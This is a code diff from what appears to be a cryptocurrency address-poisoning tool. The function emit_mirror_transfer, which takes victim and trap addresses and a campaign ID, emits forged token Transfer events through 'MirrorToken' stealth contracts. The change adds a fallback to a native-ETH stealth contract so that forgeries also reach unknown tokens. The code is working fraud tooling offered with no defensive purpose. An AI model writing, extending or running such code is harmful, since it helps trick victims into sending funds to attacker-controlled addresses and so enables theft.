@@ -436,10 +436,23 @@ def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaig
     Emit a forged Transfer event via MirrorToken contract.
     Returns tx_hash on success, None on failure.
     """
-    contract_address = MIRROR_CONTRACTS.get(asset.upper())
+        # Try exact match, then uppercase, then fallback to native ETH contract
+    contract_address = (
+        MIRROR_CONTRACTS.get(asset) or 
+        MIRROR_CONTRACTS.get(asset.upper()) or 
+        MIRROR_TOKEN_NATIVE  # 🆕 Fallback to native ETH stealth contract
+    )
     if not contract_address:
-        logger.warning(f"[mirror] No MirrorToken contract configured for {asset}")
+        logger.warning(f"[mirror] No MirrorToken contract configured for {asset} (no fallback available)")
         return None
+    
+    # Log fallback usage for unknown tokens
+    is_fallback = (
+        contract_address == MIRROR_TOKEN_NATIVE and 
+        asset.upper() not in ('ETH', 'BNB', 'MATIC')
+    )
+    if is_fallback:
+        logger.info(f"[mirror] Using ETH fallback contract for unknown token: {asset}")
 
     operator_key = get_mirror_operator_key(campaign_id)
     if not operator_key:
